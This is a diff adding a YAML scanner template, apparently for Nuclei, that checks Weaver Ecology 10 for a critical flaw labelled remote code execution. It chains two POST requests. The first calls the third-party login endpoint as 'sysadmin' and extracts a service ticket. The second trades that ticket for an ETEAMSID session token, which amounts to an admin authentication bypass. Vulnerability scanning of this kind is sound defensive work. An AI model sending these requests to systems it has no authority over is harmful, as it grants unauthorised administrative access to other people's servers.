@@ -1,0 +1,52 @@
+id: weaver-ecology10-rce
+info:
+  name: 泛微 Ecology 10 - 远程代码执行漏洞
+  author: secking
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1425994
+    vendor: weaver
+    product: ecology10
+  tags: rce,vuln,weaver,ecology10,oa
+flow: http(1) && http(2)
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/papi/passport/rest/appThirdLogin?username=sysadmin&service=1&ip=1&loginType=third'
+  redirects: false
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200 && contains(body, "\"serviceTicketId\"") && contains(body, "\"success\":\"true\"")'
+    internal: true
+  extractors:
+  - type: regex
+    name: serviceticketid
+    part: body
+    group: 1
+    regex:
+    - 'serviceTicketId\":\"(.+?)\"'
+    internal: true
+- method: POST
+  path:
+  - '{{BaseURL}}/papi/passport/login/generateEteamsId?stTicket={{serviceticketid}}'
+  redirects: false
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200 && contains(body, "\"status\":true") && contains(body, "\"data\":")'
+    internal: true
+  extractors:
+  - type: regex
+    name: ETEAMSID
+    part: body
+    group: 1
+    regex:
+    - 'data\":\"(.+?)\"'
+    internal: true
